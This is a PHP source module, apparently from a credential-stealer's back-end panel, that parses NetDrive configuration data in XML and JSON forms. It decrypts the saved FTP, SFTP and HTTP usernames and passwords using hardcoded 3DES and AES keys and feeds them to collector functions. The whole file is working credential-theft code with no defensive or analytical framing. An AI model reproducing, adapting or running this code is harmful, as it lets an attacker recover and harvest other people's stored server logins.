<?php
class Module_netdrive extends Module_
{
    protected function Decrypt($Password)
    {
        if (!strlen($Password))
            return '';

        $Password = hex2bin($Password);
        if ($Password === false)
        {
            return '';
        }

        $KEY_ = 'klfhuw%$#%fgjlvf'.chr(0);
        $IV_ = "\0\0\0\0\0\0\0\0";
        $Result = mcrypt_decrypt(MCRYPT_3DES, $KEY_, $Password, MCRYPT_MODE_ECB, $IV_);
        if (!strlen($Result))
        {
            return '';
        }

        return FixNonPrintable(trim($Result));
    }

    protected function Decryptv2($Source, $Key, $Iv)
    {
        if (!strlen($Source))
            return '';

		
        $Source = hex2bin($Source);
        if ($Source === false)
        {
            return '';
        }

        $plain_text = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $Key, $Source, MCRYPT_MODE_CBC, $Iv);
        if (!strlen($plain_text))
        {
            return '';
        }
		
        return FixNonPrintable(rtrim(substr($plain_text, 0, strlen($plain_text)/2), "\0\4")); //trim($plain_text); \x08\x0b
    }
    protected function ProcessItem($Element)
    {
        $Prot = Assign_($Element['Type']);
        $Prot = Assign_($Element->SSL);
        $User = $this->Decrypt($Element->User);
        $Pass = $this->Decrypt($Element->Pass);
        $Host = Assign_($Element->Address);
        $Port = Assign_($Element->Port);
		
        if($Pass != 'test@test.com')
            $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 5) , $Port), $User, $Pass);
    }

    function ProcessItems($Elements)
    {
        if(isset($Elements->Address) && isset($Elements['UID']))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->Address) && isset($Element['UID']))
            {
                $this->ProcessItem($Element);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }

    protected function ProcessNetDrive($Data)
    {
        $Data = json_decode($Data, TRUE);
        foreach($Data as $Element)
        {
            $Host = Assign_($Element['url']);
            $Port = Assign_($Element['port']);
            $Prot = Assign_($Element['type']);
            $User = $this->Decryptv2($Element['user'], "netdrivenetdrive", "evirdtenevirdten");
            $Pass = $this->Decryptv2($Element['password'], "evirdtenevirdten", "netdrivenetdrive");
			
            if ($Prot == 'ftp' || $Prot == 'sftp' || $Prot == 'ftps' )
			{
				$this->add_ftp($this->ftp_force_ssh($Host, $Prot == 'sftp'), $User, $Pass);
			}
                
            else
                $this->add_http($Host, $User, $Pass);
        }
    }
    protected function ProcessOldNetDrive($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        $this->ProcessItems($XML_);
        $XML_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
            {
                $Data = iconv("UTF-16", "UTF-8", $Data);
                $Data = str_replace('encoding="UTF-16"', 'encoding="UTF-8"', $Data);
            }
            $this->ProcessOldNetDrive($Data);
            break;
        case 1:
            $this->ProcessNetDrive($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

